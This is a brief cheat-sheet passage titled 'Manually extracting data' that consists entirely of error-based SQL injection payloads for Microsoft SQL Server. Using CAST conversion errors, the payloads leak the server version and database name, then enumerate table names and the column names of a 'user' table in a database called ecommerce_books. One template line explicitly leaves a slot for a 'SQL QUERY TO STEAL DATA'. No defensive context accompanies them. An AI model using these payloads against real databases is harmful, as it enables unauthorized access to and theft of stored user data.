## Manually extracting data

```sql
999 OR 1 = CAST (<SQL QUERY TO STEAL DATA> AS VARCHAR(4096))
9999 OR 1=CAST(@@version as varchar(4096))
9999 OR 1=CAST(DB_NAME() as varchar(4096))
9999 or 1 IN (SELECT TOP 1 CAST(name as varchar(4096)) FROM [ecommerce_books]..sysobjects WHERE xtype='U')
9999 or 1 IN (SELECT TOP 1 CAST(name as varchar(4096)) FROM [ecommerce_books]..sysobjects WHERE xtype='U' and name!= 'product')
9999 or 1 IN (SELECT TOP 1 CAST([ecommerce_books]..syscolumns.name as varchar(4096) ) FROM [ecommerce_books]..syscolumns, [ecommerce_books]..sysobjects WHERE [ecommerce_books]..syscolumns.id=[ecommerce_books]..sysobjects.id AND [ecommerce_books]..sysobjects.name='user')
9999 or 1 IN (SELECT TOP 1 CAST([ecommerce_books]..syscolumns.name as varchar(4096) ) FROM [ecommerce_books]..syscolumns, [ecommerce_books]..sysobjects WHERE [ecommerce_books]..syscolumns.id=[ecommerce_books]..sysobjects.id AND [ecommerce_books]..sysobjects.name='user' AND [ecommerce_books]..syscolumns.name !='id')
```